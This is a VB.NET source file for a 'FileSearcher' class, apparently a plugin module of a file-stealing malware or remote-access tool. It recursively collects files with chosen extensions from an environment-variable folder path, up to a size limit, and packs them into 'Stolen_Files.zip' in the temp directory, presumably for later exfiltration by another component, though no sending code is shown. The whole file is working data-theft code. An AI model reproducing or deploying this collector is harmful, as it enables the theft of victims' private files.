Imports System.IO
Imports System.IO.Compression

Public Class FileSearcher
    Public paramters() As Object = Nothing
    Dim ZipfilePath As String = Path.Combine(Path.GetTempPath, "Stolen_Files.zip")
    Dim SizeLimit As Integer = 99999999
    Dim CurrentSize As Integer = 0
    Dim Extensions As List(Of String) = New List(Of String)()

    Public Function Run()
        Try

            Dim extens() As String = DirectCast(paramters(0), String).Split("|")(1).Replace("[", "").Replace("]", "").Split(",")

            For Each exs As String In extens
                Extensions.Add(exs)
            Next

            If (FileSearcher(DirectCast(paramters(0), String).Split("|")(0))) Then
                Return True
            Else
                Return False

            End If
        Catch ex As Exception
            Return False
        End Try
    End Function

    Public Function FileSearcher(ByVal FolderPath As String)
        Try
            Dim files As List(Of String) = GetAllAccessibleFiles(Environ(FolderPath.Replace("%", "")))
            Save(files)
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Private Function Save(ByVal files As List(Of String)) As Boolean
        Try
            If File.Exists(ZipfilePath) Then File.Delete(ZipfilePath)
            Using archive As ZipArchive = ZipFile.Open(ZipfilePath, ZipArchiveMode.Create)
                For Each fPath In files
                    archive.CreateEntryFromFile(fPath, Path.GetFileName(fPath))
                Next
            End Using
            Return True
        Catch
            Return False
        End Try
    End Function

    Public Function GetAllAccessibleFiles(ByVal rootPath As String, Optional ByVal alreadyFound As List(Of String) = Nothing) As List(Of String)
        Try
            If alreadyFound Is Nothing Then alreadyFound = New List(Of String)()
            Dim di As DirectoryInfo = New DirectoryInfo(rootPath)
            Dim dirs = di.GetDirectories()

            For Each dir As DirectoryInfo In dirs

                If Not ((dir.Attributes And FileAttributes.Hidden) = FileAttributes.Hidden) Then
                    alreadyFound = GetAllAccessibleFiles(dir.FullName, alreadyFound)
                End If
            Next

            Dim files = Directory.GetFiles(rootPath)


            For Each file As String In files
                If CurrentSize >= SizeLimit Then
                    Exit For
                End If

                If Extensions.Contains(Path.GetExtension(file).ToLower.Replace(".", "")) Then
                    Dim finfo As New FileInfo(file)
                    alreadyFound.Add(file)
                    CurrentSize = CurrentSize + finfo.Length
                End If
            Next

        Catch ex As Exception

        End Try
        Return alreadyFound
    End Function
End Class
